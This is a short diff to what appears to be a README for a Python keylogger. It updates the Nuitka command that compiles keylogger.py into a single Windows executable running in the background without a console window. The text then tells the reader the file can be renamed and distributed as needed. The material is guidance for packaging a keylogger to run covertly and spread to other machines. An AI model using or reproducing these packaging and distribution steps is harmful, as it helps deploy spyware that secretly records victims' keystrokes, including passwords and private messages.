@@ -64,7 +64,7 @@ python keylogger.py
 Use the following command to compile your Python script to a **single `.exe`** that **runs in the background** (no terminal pop-up):
 
 ```bash
-C:\Users\devil\AppData\Roaming\Python\Python312\Scripts\nuitka --standalone --onefile --windows-disable-console keylogger.py
+ & "$env:USERPROFILE\AppData\Roaming\Python\Python312\Scripts\nuitka.cmd" --standalone --onefile --windows-disable-console keylogger.py
 ```
 
 The executable will be located in the `/keylogger.dist/` folder. You can rename and distribute it as needed.
